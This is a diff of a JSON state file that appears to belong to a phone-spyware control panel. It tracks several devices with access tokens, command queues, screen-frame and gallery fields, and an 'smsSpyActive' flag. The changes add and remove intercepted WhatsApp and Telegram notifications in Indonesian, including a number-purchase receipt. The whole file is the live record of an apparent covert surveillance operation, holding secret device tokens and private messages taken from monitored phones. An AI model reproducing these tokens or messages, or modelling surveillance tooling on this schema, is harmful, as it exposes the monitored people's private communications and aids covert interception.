@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776777916646,
+    "lastSeen": 1776777922427,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3555 pesan dari 22 chat",
+        "time": "21/04 20:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776777918337
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎JB1 ALDY BANYUMAS JATENG (67 pesan): ~ R4f",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:48",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775698141
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3740 pesan dari 23 chat",
-        "time": "21/04 19:48",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775680903
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776777917298,
+    "lastSeen": 1776777923780,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 20:25",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776777925299
+      },
       {
         "appName": "Telegram",
         "sender": "ROOM PUBLIK BY JEFF: Rose",
@@ -14394,14 +14402,6 @@
         "time": "21/04 19:50",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776775816353
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: WhatsApp\n• Negara: Indonesia 🇮🇩\n• Server: Server (1)\n• Nomor: +6281*******74\n• Waktu: 21/04/2026, 19.47",
-        "time": "21/04 19:50",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776775816328
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776777916289,
+    "lastSeen": 1776777922219,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
